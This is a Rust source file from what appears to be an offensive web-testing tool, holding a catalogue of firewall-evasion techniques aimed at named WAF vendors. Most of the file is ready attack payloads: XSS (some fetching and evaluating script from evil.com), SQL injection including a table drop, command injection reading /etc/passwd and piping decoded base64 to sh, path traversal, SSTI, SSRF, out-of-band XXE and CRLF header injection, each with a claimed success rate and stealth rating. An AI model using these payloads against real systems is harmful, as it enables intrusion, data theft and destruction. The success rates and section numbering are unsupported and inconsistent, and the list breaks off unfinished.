use std::collections::HashMap;

use serde::{Deserialize, Serialize};

use crate::waf_fingerprinter_v2::WafVendor;

/// Payload type the technique targets.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum PayloadType {
    Xss,
    Sqli,
    CommandInjection,
    PathTraversal,
    Ssti,
    Ssrf,
    Xxe,
    Ldap,
    Xpath,
    Crlf,
    OpenRedirect,
    Deserialization,
}

impl std::fmt::Display for PayloadType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Xss => write!(f, "XSS"),
            Self::Sqli => write!(f, "SQLi"),
            Self::CommandInjection => write!(f, "Command Injection"),
            Self::PathTraversal => write!(f, "Path Traversal"),
            Self::Ssti => write!(f, "SSTI"),
            Self::Ssrf => write!(f, "SSRF"),
            Self::Xxe => write!(f, "XXE"),
            Self::Ldap => write!(f, "LDAP"),
            Self::Xpath => write!(f, "XPath"),
            Self::Crlf => write!(f, "CRLF"),
            Self::OpenRedirect => write!(f, "Open Redirect"),
            Self::Deserialization => write!(f, "Deserialization"),
        }
    }
}

/// Encoding method used by the technique.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum EvasionEncoding {
    None,
    UrlEncoding,
    DoubleUrlEncoding,
    UnicodeNormalization,
    OverlongUtf8,
    HtmlEntity,
    HexEncoding,
    OctalEncoding,
    Base64,
    JsUnicode,
    CssEscape,
    MixedCase,
    CommentInsertion,
    WhitespaceVariation,
    NullByte,
    ChunkedTransfer,
    Multipart,
    CharSubstitution,
}

impl std::fmt::Display for EvasionEncoding {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::None => write!(f, "none"),
            Self::UrlEncoding => write!(f, "url"),
            Self::DoubleUrlEncoding => write!(f, "double-url"),
            Self::UnicodeNormalization => write!(f, "unicode"),
            Self::OverlongUtf8 => write!(f, "overlong-utf8"),
            Self::HtmlEntity => write!(f, "html-entity"),
            Self::HexEncoding => write!(f, "hex"),
            Self::OctalEncoding => write!(f, "octal"),
            Self::Base64 => write!(f, "base64"),
            Self::JsUnicode => write!(f, "js-unicode"),
            Self::CssEscape => write!(f, "css-escape"),
            Self::MixedCase => write!(f, "mixed-case"),
            Self::CommentInsertion => write!(f, "comment-insertion"),
            Self::WhitespaceVariation => write!(f, "whitespace"),
            Self::NullByte => write!(f, "null-byte"),
            Self::ChunkedTransfer => write!(f, "chunked-te"),
            Self::Multipart => write!(f, "multipart"),
            Self::CharSubstitution => write!(f, "char-substitution"),
        }
    }
}

/// Stealth level of the technique.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum StealthLevel {
    Loud,
    Moderate,
    Stealthy,
    Ghost,
}

impl std::fmt::Display for StealthLevel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Loud => write!(f, "loud"),
            Self::Moderate => write!(f, "moderate"),
            Self::Stealthy => write!(f, "stealthy"),
            Self::Ghost => write!(f, "ghost"),
        }
    }
}

/// A single evasion technique entry in the catalogue.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvasionTechniqueEntry {
    pub id: u32,
    pub name: String,
    pub description: String,
    pub payload_types: Vec<PayloadType>,
    pub encoding: EvasionEncoding,
    pub target_vendors: Vec<WafVendor>,
    pub success_rate: f64,
    pub stealth_level: StealthLevel,
    pub example_payload: String,
    pub composable_with: Vec<u32>,
    pub tags: Vec<String>,
}

/// Query filter for searching the catalogue.
#[derive(Debug, Clone, Default)]
pub struct CatalogueQuery {
    pub payload_type: Option<PayloadType>,
    pub vendor: Option<WafVendor>,
    pub encoding: Option<EvasionEncoding>,
    pub min_success_rate: Option<f64>,
    pub max_stealth_level: Option<StealthLevel>,
    pub min_stealth_level: Option<StealthLevel>,
    pub tag: Option<String>,
}

impl CatalogueQuery {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn with_payload_type(mut self, pt: PayloadType) -> Self {
        self.payload_type = Some(pt);
        self
    }

    pub fn with_vendor(mut self, vendor: WafVendor) -> Self {
        self.vendor = Some(vendor);
        self
    }

    pub fn with_encoding(mut self, enc: EvasionEncoding) -> Self {
        self.encoding = Some(enc);
        self
    }

    pub fn with_min_success_rate(mut self, rate: f64) -> Self {
        self.min_success_rate = Some(rate);
        self
    }

    pub fn with_min_stealth(mut self, level: StealthLevel) -> Self {
        self.min_stealth_level = Some(level);
        self
    }

    pub fn with_tag(mut self, tag: &str) -> Self {
        self.tag = Some(tag.to_string());
        self
    }
}

/// Evasion Technique Catalogue: searchable database of 100+ evasion techniques.
pub struct EvasionCatalogue {
    techniques: Vec<EvasionTechniqueEntry>,
    by_id: HashMap<u32, usize>,
}

impl EvasionCatalogue {
    pub fn new() -> Self {
        let techniques = build_catalogue();
        let by_id: HashMap<u32, usize> = techniques
            .iter()
            .enumerate()
            .map(|(idx, t)| (t.id, idx))
            .collect();
        Self { techniques, by_id }
    }

    pub fn total_techniques(&self) -> usize {
        self.techniques.len()
    }

    pub fn get_by_id(&self, id: u32) -> Option<&EvasionTechniqueEntry> {
        self.by_id.get(&id).map(|idx| &self.techniques[*idx])
    }

    /// Search the catalogue with filters.
    pub fn search(&self, query: &CatalogueQuery) -> Vec<&EvasionTechniqueEntry> {
        self.techniques
            .iter()
            .filter(|t| {
                if let Some(pt) = &query.payload_type
                    && !t.payload_types.contains(pt)
                {
                    return false;
                }
                if query
                    .vendor
                    .as_ref()
                    .is_some_and(|vendor| !t.target_vendors.contains(vendor))
                {
                    return false;
                }
                if query
                    .encoding
                    .as_ref()
                    .is_some_and(|enc| t.encoding != *enc)
                {
                    return false;
                }
                if query
                    .min_success_rate
                    .is_some_and(|min_rate| t.success_rate < min_rate)
                {
                    return false;
                }
                if query
                    .min_stealth_level
                    .as_ref()
                    .is_some_and(|min_stealth| t.stealth_level < *min_stealth)
                {
                    return false;
                }
                if let Some(tag) = &query.tag {
                    let tag_lower = tag.to_lowercase();
                    if !t
                        .tags
                        .iter()
                        .any(|tg| tg.to_lowercase().contains(&tag_lower))
                    {
                        return false;
                    }
                }
                true
            })
            .collect()
    }

    /// Find techniques composable with a given technique id.
    pub fn composable_with(&self, technique_id: u32) -> Vec<&EvasionTechniqueEntry> {
        let technique = match self.get_by_id(technique_id) {
            Some(t) => t,
            None => return Vec::new(),
        };

        technique
            .composable_with
            .iter()
            .filter_map(|id| self.get_by_id(*id))
            .collect()
    }

    /// Get all techniques sorted by success rate descending.
    pub fn top_techniques(&self, limit: usize) -> Vec<&EvasionTechniqueEntry> {
        let mut sorted: Vec<&EvasionTechniqueEntry> = self.techniques.iter().collect();
        sorted.sort_by(|a, b| {
            b.success_rate
                .partial_cmp(&a.success_rate)
                .unwrap_or(std::cmp::Ordering::Equal)
        });
        sorted.truncate(limit);
        sorted
    }

    /// Get all unique payload types in the catalogue.
    pub fn payload_types(&self) -> Vec<PayloadType> {
        let mut types: Vec<PayloadType> = self
            .techniques
            .iter()
            .flat_map(|t| t.payload_types.clone())
            .collect::<std::collections::HashSet<_>>()
            .into_iter()
            .collect();
        types.sort_by_key(|t| format!("{}", t));
        types
    }

    /// Get techniques by stealth level.
    pub fn by_stealth(&self, level: StealthLevel) -> Vec<&EvasionTechniqueEntry> {
        self.techniques
            .iter()
            .filter(|t| t.stealth_level == level)
            .collect()
    }
}

impl Default for EvasionCatalogue {
    fn default() -> Self {
        Self::new()
    }
}

macro_rules! technique {
    ($id:expr, $name:expr, $desc:expr, $types:expr, $enc:expr, $vendors:expr, $rate:expr, $stealth:expr, $example:expr, $compose:expr, $tags:expr) => {
        EvasionTechniqueEntry {
            id: $id,
            name: $name.to_string(),
            description: $desc.to_string(),
            payload_types: $types,
            encoding: $enc,
            target_vendors: $vendors,
            success_rate: $rate,
            stealth_level: $stealth,
            example_payload: $example.to_string(),
            composable_with: $compose,
            tags: $tags.iter().map(|s: &&str| s.to_string()).collect(),
        }
    };
}

fn build_catalogue() -> Vec<EvasionTechniqueEntry> {
    let all_vendors = vec![
        WafVendor::Cloudflare,
        WafVendor::Akamai,
        WafVendor::AwsWaf,
        WafVendor::ModSecurity,
        WafVendor::Imperva,
        WafVendor::F5BigIp,
    ];
    let cloud_vendors = vec![
        WafVendor::Cloudflare,
        WafVendor::Akamai,
        WafVendor::AwsWaf,
        WafVendor::AzureFrontDoor,
        WafVendor::Fastly,
    ];
    let sig_vendors = vec![
        WafVendor::ModSecurity,
        WafVendor::F5BigIp,
        WafVendor::Barracuda,
        WafVendor::FortiWeb,
        WafVendor::SonicWall,
    ];
    let ml_vendors = vec![
        WafVendor::Imperva,
        WafVendor::Reblaze,
        WafVendor::WallArm,
        WafVendor::Radware,
    ];

    vec![
        // === XSS TECHNIQUES (1-25) ===
        technique!(1, "Double URL Encoded XSS", "Double URL encode angle brackets to bypass single-decode WAFs", vec![PayloadType::Xss], EvasionEncoding::DoubleUrlEncoding, cloud_vendors.clone(), 0.72, StealthLevel::Moderate, "%253Cscript%253Ealert(1)%253C/script%253E", vec![2, 5, 10], &["xss", "encoding", "url"]),
        technique!(2, "Unicode XSS Bypass", "Use Unicode fullwidth characters for script tags", vec![PayloadType::Xss], EvasionEncoding::UnicodeNormalization, sig_vendors.clone(), 0.68, StealthLevel::Stealthy, "\u{FF1C}script\u{FF1E}alert(1)\u{FF1C}/script\u{FF1E}", vec![1, 3, 10], &["xss", "unicode", "normalization"]),
        technique!(3, "HTML Entity XSS", "HTML entity encode the payload to bypass tag filters", vec![PayloadType::Xss], EvasionEncoding::HtmlEntity, all_vendors.clone(), 0.65, StealthLevel::Moderate, "&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;", vec![1, 2, 10], &["xss", "html", "entity"]),
        technique!(4, "SVG onload XSS", "Use SVG tag with onload event instead of script tag", vec![PayloadType::Xss], EvasionEncoding::None, sig_vendors.clone(), 0.70, StealthLevel::Moderate, "<svg onload=alert(1)>", vec![1, 5, 10], &["xss", "svg", "event"]),
        technique!(5, "JS Unicode Escape XSS", "JavaScript unicode escape sequences in event handlers", vec![PayloadType::Xss], EvasionEncoding::JsUnicode, cloud_vendors.clone(), 0.60, StealthLevel::Stealthy, "<img src=x onerror=\\u0061lert(1)>", vec![1, 2, 10], &["xss", "javascript", "unicode"]),
        technique!(6, "CSS Expression XSS", "CSS escape sequences in style contexts", vec![PayloadType::Xss], EvasionEncoding::CssEscape, sig_vendors.clone(), 0.55, StealthLevel::Stealthy, "xss:expression(alert(1))", vec![5, 10], &["xss", "css", "expression"]),
        technique!(7, "Overlong UTF-8 XSS", "Overlong UTF-8 encoding of angle brackets", vec![PayloadType::Xss], EvasionEncoding::OverlongUtf8, sig_vendors.clone(), 0.73, StealthLevel::Stealthy, "%C0%BC%C1%B3%C1%A3ript%C0%BE", vec![1, 2, 10], &["xss", "utf8", "overlong"]),
        technique!(8, "Comment Splitting XSS", "Split script tag with HTML comments", vec![PayloadType::Xss], EvasionEncoding::CommentInsertion, sig_vendors.clone(), 0.58, StealthLevel::Moderate, "<scr<!--split-->ipt>alert(1)</scr<!--split-->ipt>", vec![1, 10], &["xss", "comment", "splitting"]),
        technique!(9, "Null Byte XSS", "Insert null bytes to truncate WAF pattern matching", vec![PayloadType::Xss], EvasionEncoding::NullByte, sig_vendors.clone(), 0.52, StealthLevel::Moderate, "<scr%00ipt>alert(1)</script>", vec![1, 7, 10], &["xss", "null", "truncation"]),
        technique!(10, "Mixed Case XSS", "Mixed case to bypass case-sensitive filters", vec![PayloadType::Xss], EvasionEncoding::MixedCase, sig_vendors.clone(), 0.62, StealthLevel::Loud, "<ScRiPt>alert(1)</sCrIpT>", vec![1, 2, 3], &["xss", "case", "mutation"]),
        technique!(11, "Data URI XSS", "Embed payload in data URI scheme", vec![PayloadType::Xss], EvasionEncoding::Base64, cloud_vendors.clone(), 0.55, StealthLevel::Stealthy, "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", vec![1, 5], &["xss", "data-uri", "base64"]),
        technique!(12, "Hex Encoded XSS", "Hex encode characters in JavaScript context", vec![PayloadType::Xss], EvasionEncoding::HexEncoding, all_vendors.clone(), 0.58, StealthLevel::Moderate, "<script>\\x61lert(1)</script>", vec![1, 10], &["xss", "hex", "encoding"]),
        technique!(13, "Tab/Newline XSS", "Insert tabs and newlines to break pattern matching", vec![PayloadType::Xss], EvasionEncoding::WhitespaceVariation, sig_vendors.clone(), 0.63, StealthLevel::Stealthy, "<img\tsrc=x\nonerror=alert(1)>", vec![1, 10], &["xss", "whitespace", "tab"]),
        technique!(14, "Backtick XSS", "Use backticks instead of parentheses", vec![PayloadType::Xss], EvasionEncoding::CharSubstitution, sig_vendors.clone(), 0.60, StealthLevel::Moderate, "<script>alert`1`</script>", vec![1, 10], &["xss", "backtick", "substitution"]),
        technique!(15, "Body onload XSS", "Use body tag with onload to avoid script filter", vec![PayloadType::Xss], EvasionEncoding::None, sig_vendors.clone(), 0.50, StealthLevel::Loud, "<body onload=alert(1)>", vec![4, 10], &["xss", "event", "body"]),
        technique!(16, "Object data XSS", "Use object tag with data attribute for XSS", vec![PayloadType::Xss], EvasionEncoding::None, sig_vendors.clone(), 0.48, StealthLevel::Moderate, "<object data='javascript:alert(1)'>", vec![4, 11], &["xss", "object", "javascript"]),
        technique!(17, "Iframe srcdoc XSS", "XSS via iframe srcdoc attribute", vec![PayloadType::Xss], EvasionEncoding::HtmlEntity, cloud_vendors.clone(), 0.52, StealthLevel::Stealthy, "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'>", vec![3, 11], &["xss", "iframe", "srcdoc"]),
        technique!(18, "Template Literal XSS", "JavaScript template literals for payload delivery", vec![PayloadType::Xss], EvasionEncoding::None, sig_vendors.clone(), 0.55, StealthLevel::Moderate, "${alert(1)}", vec![5, 14], &["xss", "template", "es6"]),
        technique!(19, "Fetch API XSS", "Use fetch API to load external script", vec![PayloadType::Xss], EvasionEncoding::None, ml_vendors.clone(), 0.45, StealthLevel::Stealthy, "fetch('//evil.com').then(r=>r.text()).then(eval)", vec![5, 11], &["xss", "fetch", "api"]),
        technique!(20, "Import XSS", "Dynamic import() for script loading", vec![PayloadType::Xss], EvasionEncoding::None, sig_vendors.clone(), 0.50, StealthLevel::Stealthy, "import('//evil.com/x.js')", vec![19], &["xss", "import", "dynamic"]),

        // === SQLi TECHNIQUES (21-45) ===
        technique!(21, "Comment Insertion SQLi", "Insert SQL comments to break keyword matching", vec![PayloadType::Sqli], EvasionEncoding::CommentInsertion, all_vendors.clone(), 0.75, StealthLevel::Moderate, "SEL/**/ECT * FR/**/OM users", vec![22, 25, 30], &["sqli", "comment", "splitting"]),
        technique!(22, "Mixed Case SQLi", "Mixed case SQL keywords", vec![PayloadType::Sqli], EvasionEncoding::MixedCase, sig_vendors.clone(), 0.65, StealthLevel::Loud, "SeLeCt * FrOm users", vec![21, 25], &["sqli", "case", "mutation"]),
        technique!(23, "URL Encoded SQLi", "URL encode SQL special characters", vec![PayloadType::Sqli], EvasionEncoding::UrlEncoding, cloud_vendors.clone(), 0.60, StealthLevel::Moderate, "1%27%20OR%201%3D1%20--", vec![24, 21], &["sqli", "url", "encoding"]),
        technique!(24, "Double URL SQLi", "Double URL encode for two-stage decode bypass", vec![PayloadType::Sqli], EvasionEncoding::DoubleUrlEncoding, cloud_vendors.clone(), 0.70, StealthLevel::Stealthy, "1%2527%2520OR%25201%253D1", vec![23, 21], &["sqli", "double-url", "encoding"]),
        technique!(25, "Hex Literal SQLi", "Use hex literals for string values", vec![PayloadType::Sqli], EvasionEncoding::HexEncoding, sig_vendors.clone(), 0.68, StealthLevel::Moderate, "SELECT * FROM users WHERE name=0x61646d696e", vec![21, 30], &["sqli", "hex", "literal"]),
        technique!(26, "Unicode SQLi", "Unicode escaped SQL keywords", vec![PayloadType::Sqli], EvasionEncoding::UnicodeNormalization, ml_vendors.clone(), 0.62, StealthLevel::Stealthy, "\\u0053ELECT * FROM users", vec![21, 25], &["sqli", "unicode", "keyword"]),
        technique!(27, "Null Byte SQLi", "Null byte before SQL keyword", vec![PayloadType::Sqli], EvasionEncoding::NullByte, sig_vendors.clone(), 0.55, StealthLevel::Moderate, "%00UNION SELECT 1,2,3", vec![21, 25], &["sqli", "null", "prefix"]),
        technique!(28, "Whitespace Substitution SQLi", "Replace spaces with alternative whitespace", vec![PayloadType::Sqli], EvasionEncoding::WhitespaceVariation, all_vendors.clone(), 0.70, StealthLevel::Stealthy, "SELECT\t*\nFROM\rusers", vec![21, 22], &["sqli", "whitespace", "tab"]),
        technique!(29, "Overlong UTF-8 SQLi", "Overlong UTF-8 encoding of SQL quotes", vec![PayloadType::Sqli], EvasionEncoding::OverlongUtf8, sig_vendors.clone(), 0.72, StealthLevel::Stealthy, "%C0%A7 OR 1=1--", vec![24, 25], &["sqli", "utf8", "overlong"]),
        technique!(30, "Scientific Notation SQLi", "Use scientific notation for numeric bypass", vec![PayloadType::Sqli], EvasionEncoding::None, sig_vendors.clone(), 0.50, StealthLevel::Moderate, "1e0UNION SELECT 1,2,3", vec![21, 28], &["sqli", "scientific", "numeric"]),
        technique!(31, "Concat Function SQLi", "Use CONCAT to build strings avoiding keyword filters", vec![PayloadType::Sqli], EvasionEncoding::None, sig_vendors.clone(), 0.58, StealthLevel::Stealthy, "CONCAT(0x73,0x65,0x6c,0x65,0x63,0x74)", vec![25, 21], &["sqli", "concat", "function"]),
        technique!(32, "JSON Extract SQLi", "Use JSON functions to bypass filters", vec![PayloadType::Sqli], EvasionEncoding::None, ml_vendors.clone(), 0.52, StealthLevel::Ghost, "JSON_EXTRACT(col, '$.key') UNION SELECT 1", vec![21], &["sqli", "json", "function"]),
        technique!(33, "Stacked Queries SQLi", "Semicolon-separated stacked queries", vec![PayloadType::Sqli], EvasionEncoding::None, sig_vendors.clone(), 0.45, StealthLevel::Loud, "1; DROP TABLE users--", vec![21, 22], &["sqli", "stacked", "semicolon"]),
        technique!(34, "Boolean Blind SQLi", "Boolean-based blind injection with minimal syntax", vec![PayloadType::Sqli], EvasionEncoding::None, all_vendors.clone(), 0.60, StealthLevel::Ghost, "1 AND 1=1", vec![28, 30], &["sqli", "blind", "boolean"]),
        technique!(35, "Time Blind SQLi", "Time-based blind injection", vec![PayloadType::Sqli], EvasionEncoding::None, all_vendors.clone(), 0.55, StealthLevel::Ghost, "1 AND SLEEP(5)", vec![34, 28], &["sqli", "blind", "time"]),

        // === COMMAND INJECTION TECHNIQUES (36-50) ===
        technique!(36, "Newline Command Injection", "Newline character to start new command", vec![PayloadType::CommandInjection], EvasionEncoding::None, all_vendors.clone(), 0.65, StealthLevel::Moderate, "input%0als", vec![37, 40], &["cmdi", "newline", "separator"]),
        technique!(37, "Backtick Command Substitution", "Backtick command substitution", vec![PayloadType::CommandInjection], EvasionEncoding::None, sig_vendors.clone(), 0.60, StealthLevel::Moderate, "`cat /etc/passwd`", vec![36, 38], &["cmdi", "backtick", "substitution"]),
        technique!(38, "Dollar Paren Substitution", "$(cmd) syntax for command substitution", vec![PayloadType::CommandInjection], EvasionEncoding::None, sig_vendors.clone(), 0.58, StealthLevel::Moderate, "$(cat /etc/passwd)", vec![36, 37], &["cmdi", "dollar", "substitution"]),
        technique!(39, "Env Variable Injection", "Use environment variables to construct commands", vec![PayloadType::CommandInjection], EvasionEncoding::None, ml_vendors.clone(), 0.55, StealthLevel::Stealthy, "${IFS}cat${IFS}/etc/passwd", vec![36, 40], &["cmdi", "env", "variable"]),
        technique!(40, "URL Encoded Semicolon", "URL encode the semicolon separator", vec![PayloadType::CommandInjection], EvasionEncoding::UrlEncoding, cloud_vendors.clone(), 0.62, StealthLevel::Moderate, "input%3Bls", vec![36, 41], &["cmdi", "url", "semicolon"]),
        technique!(41, "Double URL Pipe", "Double URL encode pipe for command chaining", vec![PayloadType::CommandInjection], EvasionEncoding::DoubleUrlEncoding, cloud_vendors.clone(), 0.68, StealthLevel::Stealthy, "input%257Cls", vec![36, 40], &["cmdi", "pipe", "double-url"]),
        technique!(42, "Wildcard Bypass", "Use wildcards to avoid blocked command names", vec![PayloadType::CommandInjection], EvasionEncoding::CharSubstitution, sig_vendors.clone(), 0.70, StealthLevel::Stealthy, "/???/??t /???/p??s??", vec![39], &["cmdi", "wildcard", "glob"]),
        technique!(43, "Hex Command", "Use hex-encoded command with printf", vec![PayloadType::CommandInjection], EvasionEncoding::HexEncoding, sig_vendors.clone(), 0.55, StealthLevel::Stealthy, "$(printf '\\x63\\x61\\x74' /etc/passwd)", vec![38, 42], &["cmdi", "hex", "printf"]),
        technique!(44, "Octal Command", "Use octal encoding with $'...' syntax", vec![PayloadType::CommandInjection], EvasionEncoding::OctalEncoding, sig_vendors.clone(), 0.52, StealthLevel::Stealthy, "$'\\143\\141\\164' /etc/passwd", vec![43, 42], &["cmdi", "octal", "bash"]),
        technique!(45, "Base64 Pipeline", "Base64 encode command and pipe through decoder", vec![PayloadType::CommandInjection], EvasionEncoding::Base64, ml_vendors.clone(), 0.60, StealthLevel::Ghost, "echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh", vec![43], &["cmdi", "base64", "pipeline"]),

        // === PATH TRAVERSAL TECHNIQUES (46-60) ===
        technique!(46, "Double Dot URL Encoded", "URL encode dots for path traversal", vec![PayloadType::PathTraversal], EvasionEncoding::UrlEncoding, cloud_vendors.clone(), 0.65, StealthLevel::Moderate, "%2e%2e%2f%2e%2e%2fetc/passwd", vec![47, 50], &["path", "url", "dotdot"]),
        technique!(47, "Double URL Traversal", "Double URL encode path components", vec![PayloadType::PathTraversal], EvasionEncoding::DoubleUrlEncoding, cloud_vendors.clone(), 0.70, StealthLevel::Stealthy, "%252e%252e%252f%252e%252e%252fetc/passwd", vec![46, 50], &["path", "double-url", "traversal"]),
        technique!(48, "Overlong UTF-8 Dot", "Overlong UTF-8 encoding of dot character", vec![PayloadType::PathTraversal], EvasionEncoding::OverlongUtf8, sig_vendors.clone(), 0.72, StealthLevel::Stealthy, "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd", vec![46, 47], &["path", "utf8", "overlong"]),
        technique!(49, "Null Byte Truncation", "Null byte to truncate file extension checks", vec![PayloadType::PathTraversal], EvasionEncoding::NullByte, sig_vendors.clone(), 0.50, StealthLevel::Moderate, "../../etc/passwd%00.jpg", vec![46], &["path", "null", "truncation"]),
        technique!(50, "Backslash Traversal", "Use backslash on Windows or mixed separators", vec![PayloadType::PathTraversal], EvasionEncoding::CharSubstitution, sig_vendors.clone(), 0.55, StealthLevel::Moderate, "..\\..\\etc\\passwd", vec![46, 47], &["path", "backslash", "windows"]),
        technique!(51, "Unicode Dot Traversal", "Unicode fullwidth dot for traversal", vec![PayloadType::PathTraversal], EvasionEncoding::UnicodeNormalization, ml_vendors.clone(), 0.60, StealthLevel::Stealthy, "\u{FF0E}\u{FF0E}/\u{FF0E}\u{FF0E}/etc/passwd", vec![46, 48], &["path", "unicode", "fullwidth"]),
        technique!(52, "Nested Traversal", "Nested traversal to survive stripping", vec![PayloadType::PathTraversal], EvasionEncoding::None, all_vendors.clone(), 0.58, StealthLevel::Moderate, "....//....//etc/passwd", vec![46], &["path", "nested", "stripping"]),

        // === SSTI TECHNIQUES (53-60) ===
        technique!(53, "Jinja2 SSTI", "Jinja2 template injection with class traversal", vec![PayloadType::Ssti], EvasionEncoding::None, sig_vendors.clone(), 0.65, StealthLevel::Moderate, "{{''.__class__.__mro__[1].__subclasses__()}}", vec![54, 55], &["ssti", "jinja2", "python"]),
        technique!(54, "Unicode SSTI", "Unicode encode template delimiters", vec![PayloadType::Ssti], EvasionEncoding::UnicodeNormalization, cloud_vendors.clone(), 0.60, StealthLevel::Stealthy, "\\u007b\\u007b7*7\\u007d\\u007d", vec![53], &["ssti", "unicode", "delimiter"]),
        technique!(55, "Hex SSTI", "Hex encode critical SSTI characters", vec![PayloadType::Ssti], EvasionEncoding::HexEncoding, sig_vendors.clone(), 0.55, StealthLevel::Stealthy, "%7B%7B7*7%7D%7D", vec![53, 54], &["ssti", "hex", "encoding"]),
        technique!(56, "Alternate Delimiters SSTI", "Use alternate template delimiters", vec![PayloadType::Ssti], EvasionEncoding::None, sig_vendors.clone(), 0.50, StealthLevel::Moderate, "{%set x=7*7%}{{x}}", vec![53], &["ssti", "delimiter", "alternate"]),
        technique!(57, "Filter Bypass SSTI", "Bypass Jinja2 filters using attr()", vec![PayloadType::Ssti], EvasionEncoding::None, ml_vendors.clone(), 0.58, StealthLevel::Stealthy, "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}", vec![53, 55], &["ssti", "filter", "attr"]),

        // === SSRF TECHNIQUES (58-65) ===
        technique!(58, "Decimal IP SSRF", "Use decimal IP notation to bypass URL parsers", vec![PayloadType::Ssrf], EvasionEncoding::None, cloud_vendors.clone(), 0.70, StealthLevel::Stealthy, "http://2130706433/admin", vec![59, 60], &["ssrf", "ip", "decimal"]),
        technique!(59, "Hex IP SSRF", "Hex-encoded IP address", vec![PayloadType::Ssrf], EvasionEncoding::HexEncoding, cloud_vendors.clone(), 0.65, StealthLevel::Stealthy, "http://0x7f000001/admin", vec![58, 60], &["ssrf", "ip", "hex"]),
        technique!(60, "Octal IP SSRF", "Octal-encoded IP address", vec![PayloadType::Ssrf], EvasionEncoding::OctalEncoding, sig_vendors.clone(), 0.60, StealthLevel::Stealthy, "http://0177.0.0.01/admin", vec![58, 59], &["ssrf", "ip", "octal"]),
        technique!(61, "IPv6 SSRF", "Use IPv6 notation to bypass IPv4 filters", vec![PayloadType::Ssrf], EvasionEncoding::None, sig_vendors.clone(), 0.55, StealthLevel::Moderate, "http://[::1]/admin", vec![58], &["ssrf", "ipv6", "localhost"]),
        technique!(62, "DNS Rebinding SSRF", "Exploit DNS rebinding for SSRF", vec![PayloadType::Ssrf], EvasionEncoding::None, ml_vendors.clone(), 0.50, StealthLevel::Ghost, "http://rebind.network:8443/admin", vec![58], &["ssrf", "dns", "rebinding"]),
        technique!(63, "URL Encoding SSRF", "URL encode internal IP components", vec![PayloadType::Ssrf], EvasionEncoding::UrlEncoding, cloud_vendors.clone(), 0.58, StealthLevel::Moderate, "http://127%2E0%2E0%2E1/admin", vec![58, 59], &["ssrf", "url", "encoding"]),
        technique!(64, "Redirect SSRF", "Open redirect chain to reach internal host", vec![PayloadType::Ssrf, PayloadType::OpenRedirect], EvasionEncoding::None, all_vendors.clone(), 0.62, StealthLevel::Stealthy, "https://example.com/redirect?url=http://127.0.0.1/admin", vec![58], &["ssrf", "redirect", "chain"]),

        // === XXE TECHNIQUES (65-72) ===
        technique!(65, "Basic XXE", "Standard XML external entity injection", vec![PayloadType::Xxe], EvasionEncoding::None, sig_vendors.clone(), 0.60, StealthLevel::Moderate, "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>", vec![66, 67], &["xxe", "entity", "file"]),
        technique!(66, "Parameter Entity XXE", "Use parameter entities for OOB extraction", vec![PayloadType::Xxe], EvasionEncoding::None, sig_vendors.clone(), 0.55, StealthLevel::Stealthy, "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/xxe.dtd'>%xxe;]>", vec![65, 67], &["xxe", "parameter", "oob"]),
        technique!(67, "UTF-16 XXE", "Use UTF-16 encoding to bypass XML parsers", vec![PayloadType::Xxe], EvasionEncoding::UnicodeNormalization, cloud_vendors.clone(), 0.58, StealthLevel::Stealthy, "<?xml version='1.0' encoding='UTF-16'?><!DOCTYPE ...>", vec![65, 66], &["xxe", "utf16", "encoding"]),
        technique!(68, "XInclude XXE", "XInclude for XXE when DOCTYPE is blocked", vec![PayloadType::Xxe], EvasionEncoding::None, ml_vendors.clone(), 0.52, StealthLevel::Ghost, "<foo xmlns:xi='http://www.w3.org/2001/XInclude'><xi:include parse='text' href='file:///etc/passwd'/></foo>", vec![65], &["xxe", "xinclude", "bypass"]),

        // === CRLF TECHNIQUES (69-73) ===
        technique!(69, "URL Encoded CRLF", "URL encoded CRLF injection", vec![PayloadType::Crlf], EvasionEncoding::UrlEncoding, cloud_vendors.clone(), 0.65, StealthLevel::Moderate, "%0d%0aSet-Cookie:evil=true", vec![70, 71], &["crlf", "url", "header"]),
        technique!(70, "Double URL CRLF", "Double URL encode CRLF characters", vec![PayloadType::Crlf], EvasionEncoding::DoubleUrlEncoding, cloud_vendors.clone(), 0.68, StealthLevel::Stealthy, "%250d%250aSet-Cookie:evil=true", vec![69], &["crlf", "double-url", "header"]),
        technique!(71, "Unicode CRLF", "Unicode encoded carriage return and line feed", vec![PayloadType::Crlf], EvasionEncoding::UnicodeNormalization, sig_vendors.clone(), 0.55, StealthLevel::Stealthy, "\\u000d\\u000aSet-Cookie:evil=true", vec![69, 70], &["crlf", "unicode", "header"]),
        technique!(72, "UTF-8 CRLF", "Overlong UTF-8 for CR/LF bytes", vec![PayloadType::Crlf], EvasionEncoding::OverlongUtf8, sig_vendors.clone(), 0.60, StealthLevel::Stealthy, "%c0%8d%c0%8aSet-Cookie:evil=true", vec![69], &["crlf", "utf8", "overlong"]),

        // === OPEN REDIRECT (73-77) ===
        technique!(73, "Backslash Redirect", "Backslash instead of forward slash", vec![PayloadType::OpenRedirect], EvasionEncoding::CharSubstitution, all_vendors.clone(), 0.65, StealthLevel::Moderate, "//evil.com\\@example.com", vec![74, 75], &["redirect", "backslash", "url"]),
